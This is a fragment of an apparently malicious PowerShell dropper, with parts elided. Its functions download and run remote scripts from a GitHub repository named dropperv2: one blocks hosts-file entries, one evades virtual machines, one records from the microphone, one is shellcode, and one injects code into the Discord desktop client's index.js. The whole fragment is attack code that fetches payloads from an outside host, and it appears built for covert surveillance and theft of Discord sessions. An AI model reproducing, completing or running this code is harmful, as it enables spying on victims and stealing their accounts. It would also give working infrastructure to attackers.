...
function Invoke-TASKS {
    ...
    if ($blockhostsfile) {
        $link = "https://raw.githubusercontent.com/lolbodoo/dropperv2/main/blockhosts.ps1"
...
function VMPROTECT {
    $link = ("https://raw.githubusercontent.com/lolbodoo/dropperv2/main/antivm.ps1")
...
function Backup-Data {
    ...
    if ($record_mic) {
        ...
        $mic = ("https://raw.githubusercontent.com/lolbodoo/dropperv2/main/mic.ps1")
            ...
            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
                ...
                foreach ($file in $files) {
                    if ($file.Name -eq "index.js") {
                        ...
                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/lolbodoo/dropperv2/main/injection.js")
                        if ($content -ne "") {
    ...
    $kematian_shellcode = ("https://raw.githubusercontent.com/lolbodoo/dropperv2/main/kematian_shellcode.ps1")
